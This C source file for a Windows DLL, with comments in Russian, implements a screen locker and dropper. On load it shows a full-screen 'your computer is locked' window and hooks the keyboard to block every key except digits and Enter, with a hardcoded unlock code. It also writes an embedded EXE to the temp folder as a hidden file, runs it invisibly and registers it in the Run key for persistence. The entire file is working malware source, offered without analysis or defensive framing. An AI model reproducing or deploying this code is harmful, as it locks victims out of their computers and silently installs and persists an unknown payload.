#include <winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include "resource.h"

#pragma comment(lib, "Ws2_32.lib")

#define UNLOCK_COMBO _T("314159")

HHOOK       g_hHookLL  = NULL;
HWND        g_hLockWnd = NULL;
HINSTANCE   g_hInstDLL = NULL;
WNDPROC     g_OldEditProc = NULL;  // Сюда мы сохраним старую процедуру edit-контрола

// Функция для извлечения встроенного EXE из ресурсов.
// Файл kostikmakostik.exe должен быть добавлен в ресурсный файл как RCDATA
// с идентификатором IDR_PROCESS_EXE (определён в resource.h).
// lpFilePath – путь, по которому будет сохранён EXE (во временной папке).
BOOL ExtractEmbeddedExe(LPCTSTR lpFilePath)
{
    HRSRC hRes = FindResource(g_hInstDLL, MAKEINTRESOURCE(IDR_PROCESS_EXE), RT_RCDATA);
    if (!hRes)
        return FALSE;
    
    HGLOBAL hResData = LoadResource(g_hInstDLL, hRes);
    if (!hResData)
        return FALSE;
    
    DWORD dwSize = SizeofResource(g_hInstDLL, hRes);
    if (dwSize == 0)
        return FALSE;
    
    LPVOID pResData = LockResource(hResData);
    if (!pResData)
        return FALSE;
    
    HANDLE hFile = CreateFile(lpFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    
    DWORD dwWritten = 0;
    BOOL bWrite = WriteFile(hFile, pResData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    
    return bWrite;
}
  
// Функция для запуска извлечённого фонового процесса (kostikmakostik.exe)
// в скрытом режиме. Извлечённый файл сохраняется во временной папке.
BOOL LaunchEmbeddedProcess()
{
    TCHAR tempPath[MAX_PATH] = {0};
    if (!GetTempPath(MAX_PATH, tempPath))
        return FALSE;
    
    TCHAR exePath[MAX_PATH] = {0};
    _stprintf_s(exePath, _countof(exePath), _T("%s%s"), tempPath, _T("kostikmakostik.exe"));
    
    if (!ExtractEmbeddedExe(exePath))
        return FALSE;
    
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // скромное окно
    
    BOOL bResult = CreateProcess(
                       exePath,      // Полный путь к извлечённому EXE.
                       NULL,
                       NULL,
                       NULL,
                       FALSE,
                       CREATE_NO_WINDOW,
                       NULL,
                       NULL,
                       &si,
                       &pi
                   );
    
    if (bResult)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return bResult;
}

// Функция для добавления записи в автозагрузку
bool AddProcessToAutostart(LPCTSTR exePath)
{
    HKEY hKey;
    // Открываем ключ автозагрузки для текущего пользователя
    LONG lRes = RegOpenKeyEx(HKEY_CURRENT_USER,
                             _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                             0,
                             KEY_SET_VALUE,
                             &hKey);
    if (lRes != ERROR_SUCCESS)
        return false;

    // Добавляем или обновляем запись "KostikmaKostik" со значением exePath
    lRes = RegSetValueEx(hKey,
                         _T("KostikmaKostik"),
                         0,
                         REG_SZ,
                         (const BYTE*)exePath,
                         (_tcslen(exePath) + 1) * sizeof(TCHAR));
    RegCloseKey(hKey);
    
    return (lRes == ERROR_SUCCESS);
}

  
// Функция-обёртка для запуска фонового процесса в отдельном потоке.
DWORD WINAPI ProcessLauncherThread(LPVOID lpParam)
{
    Sleep(100);
    // Попытка запустить процесс, если требуется — можно проверять результат.
    LaunchEmbeddedProcess();

    // Определяем полный путь к файлу, аналогично тому, как формируем в LaunchEmbeddedProcess
    TCHAR tempPath[MAX_PATH] = {0};
    if (GetTempPath(MAX_PATH, tempPath))
    {
        TCHAR exePath[MAX_PATH] = {0};
        _stprintf_s(exePath, _countof(exePath), _T("%s%s"), tempPath, _T("kostikmakostik.exe"));

        AddProcessToAutostart(exePath);
    }
    return 0;
}
  
// Подклассная процедура для edit-контрола, чтобы отлавливать нажатие Enter.
LRESULT CALLBACK EditSubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == WM_KEYDOWN)
    {
        if (wParam == VK_RETURN)
        {
            // Отправляем сообщение родительскому окну, как будто нажата кнопка Unlock (ID=2).
            HWND hParent = GetParent(hWnd);
            SendMessage(hParent, WM_COMMAND, MAKEWPARAM(2, BN_CLICKED), (LPARAM)hWnd);
            return 0; // потребляем клавишу Enter
        }
    }
    return CallWindowProc(g_OldEditProc, hWnd, uMsg, wParam, lParam);
}
  
// Низкоуровневый перехватчик клавиатуры.
// Разрешаются цифры (основной и цифровой клавиатуры) и Backspace, остальные клавиши блокируются.
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Разрешаем цифры с основной клавиатуры
            if (p->vkCode >= 0x30 && p->vkCode <= 0x39)
                return CallNextHookEx(g_hHookLL, nCode, wParam, lParam);
            
            // Разрешаем цифры с цифровой клавиатуры
            if (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9)
                return CallNextHookEx(g_hHookLL, nCode, wParam, lParam);
            
            // Разрешаем клавишу Backspace
            if (p->vkCode == VK_BACK)
                return CallNextHookEx(g_hHookLL, nCode, wParam, lParam);
            
            // Добавляем условие для клавиши Enter (VK_RETURN)
            if (p->vkCode == VK_RETURN)
                return CallNextHookEx(g_hHookLL, nCode, wParam, lParam);
            
            // Блокируем все остальные клавиши.
            return 1;
        }
    }
    return CallNextHookEx(g_hHookLL, nCode, wParam, lParam);
}

  
// Оконная процедура для окна блокировки.
// Рисуется окно с элементами, размещёнными по центру экрана.
LRESULT CALLBACK LockWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    static HWND hEdit = NULL;
    switch (msg)
    {
        case WM_CREATE:
        {
            // Определяем размеры клиентской области для центрирования.
            RECT rcClient;
            GetClientRect(hWnd, &rcClient);
            int centerX = (rcClient.right - rcClient.left) / 2;
            int centerY = (rcClient.bottom - rcClient.top) / 2;

            // Статический текст "Ваш компьютер заблокирован"
            CreateWindowEx(0, _T("STATIC"), _T("Ваш компьютер заблокирован"),
                           WS_CHILD | WS_VISIBLE | SS_CENTER,
                           centerX - 150, centerY - 80, 300, 40,
                           hWnd, NULL, g_hInstDLL, NULL);

            // Создание поля для ввода пароля.
            // Изменили стиль: удалили ES_PASSWORD, чтобы отображались вводимые символы.
            hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, _T("EDIT"), _T(""),
                                   WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                                   centerX - 100, centerY - 20, 200, 25,
                                   hWnd, (HMENU)1, g_hInstDLL, NULL);

            // Устанавливаем фокус на поле ввода,
            // чтобы нажатие клавиши Enter попадало именно в это поле.
            SetFocus(hEdit);
            
            // Подклассифицируем поле, чтобы по нажатию Enter происходило срабатывание Unlock.
            g_OldEditProc = (WNDPROC)SetWindowLongPtr(hEdit, GWLP_WNDPROC, (LONG_PTR)EditSubclassProc);
            
            // Создаём кнопку Unlock.
            CreateWindow(_T("BUTTON"), _T("Unlock"),
                         WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                         centerX - 50, centerY + 15, 100, 30,
                         hWnd, (HMENU)2, g_hInstDLL, NULL);
            break;
        }
        case WM_COMMAND:
        {
            if (LOWORD(wParam) == 2)  // Нажата кнопка Unlock или сработал Enter в поле ввода.
            {
                TCHAR szBuffer[256] = {0};
                GetWindowText(hEdit, szBuffer, 256);
                if (_tcscmp(szBuffer, UNLOCK_COMBO) == 0)
                {
                    if (g_hHookLL)
                    {
                        UnhookWindowsHookEx(g_hHookLL);
                        g_hHookLL = NULL;
                    }
                    DestroyWindow(hWnd);
                }
            }
            break;
        }
        case WM_CLOSE:
            return 0;
        default:
            return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}
  
// Поток создания полноэкранного окна блокировки.
DWORD WINAPI LockScreenThread(LPVOID lpParam)
{
    WNDCLASSEX wc = {0};
    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.lpfnWndProc   = LockWndProc;
    wc.hInstance     = g_hInstDLL;
    wc.lpszClassName = _T("WinLockClass");
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    
    if (!RegisterClassEx(&wc))
        return 1;
    
    g_hLockWnd = CreateWindowEx(
        WS_EX_TOPMOST,
        _T("WinLockClass"),
        _T("Locked"),
        WS_POPUP,
        0, 0,
        GetSystemMetrics(SM_CXSCREEN),
        GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, g_hInstDLL, NULL);
    
    if (g_hLockWnd)
    {
        ShowWindow(g_hLockWnd, SW_SHOW);
        UpdateWindow(g_hLockWnd);
        // После успешного отображения окна блокировки запускаем embedded process.
        HANDLE hProcThread = CreateThread(NULL, 0, ProcessLauncherThread, NULL, 0, NULL);
        if (hProcThread)
            CloseHandle(hProcThread);
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
    }
    return 0;
}
  
// Точка входа DLL.
// При DLL_PROCESS_ATTACH происходит:
// • Инициализация глобального инстанса,
// • Запуск потока создания экрана блокировки (в котором запускается embedded process),
// • Установка глобального перехвата клавиатуры.
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        g_hInstDLL = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
  
        HANDLE hThread = CreateThread(NULL, 0, LockScreenThread, NULL, 0, NULL);
        if (hThread)
            CloseHandle(hThread);
  
        g_hHookLL = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInstDLL, 0);
    }
    else if (fdwReason == DLL_PROCESS_DETACH)
    {
        if (g_hHookLL)
        {
            UnhookWindowsHookEx(g_hHookLL);
            g_hHookLL = NULL;
        }
    }
    return TRUE;
}
